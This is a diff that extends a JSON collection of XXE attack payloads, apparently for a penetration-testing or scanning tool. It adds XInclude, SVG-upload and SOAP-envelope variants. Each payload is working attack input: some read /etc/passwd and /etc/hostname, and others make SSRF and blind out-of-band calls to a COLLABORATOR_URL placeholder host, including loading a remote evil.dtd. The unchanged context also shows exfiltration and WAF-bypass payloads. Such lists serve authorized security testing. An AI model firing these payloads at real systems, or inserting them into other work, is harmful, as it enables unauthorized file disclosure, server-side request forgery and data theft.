@@ -38,6 +38,29 @@
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> %local_dtd;]><root>&ISOtech;</root>", "description": "Error-based XXE repurposing local DTD file", "waf_bypass": true},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\">]><message>&start;&file;&end;</message>", "description": "CDATA wrapping to handle special chars in exfiltrated data", "waf_bypass": false}
       ]
+    },
+    "xinclude": {
+      "description": "XInclude attacks when DOCTYPE is blocked — uses xi:include namespace to read files",
+      "payloads": [
+        {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>", "description": "XInclude file read /etc/passwd", "waf_bypass": false},
+        {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hostname\"/></foo>", "description": "XInclude file read /etc/hostname", "waf_bypass": false},
+        {"payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://COLLABORATOR_URL/xxe\"/></foo>", "description": "XInclude SSRF to external server", "waf_bypass": false}
+      ]
+    },
+    "svg_xxe": {
+      "description": "XXE via SVG file upload — SVG is XML so entity declarations execute during server-side parsing",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "description": "SVG XXE file read", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/svg-xxe\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "description": "SVG XXE SSRF to Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/evil.dtd\"> %xxe;]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>test</text></svg>", "description": "SVG XXE blind OOB via parameter entity", "waf_bypass": false}
+      ]
+    },
+    "soap_xxe": {
+      "description": "XXE in SOAP envelopes — common in enterprise web services",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>", "description": "SOAP XXE file read", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/soap-xxe\"> %xxe;]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>x</test></soap:Body></soap:Envelope>", "description": "SOAP XXE blind OOB", "waf_bypass": false}
+      ]
     }
   }
 }
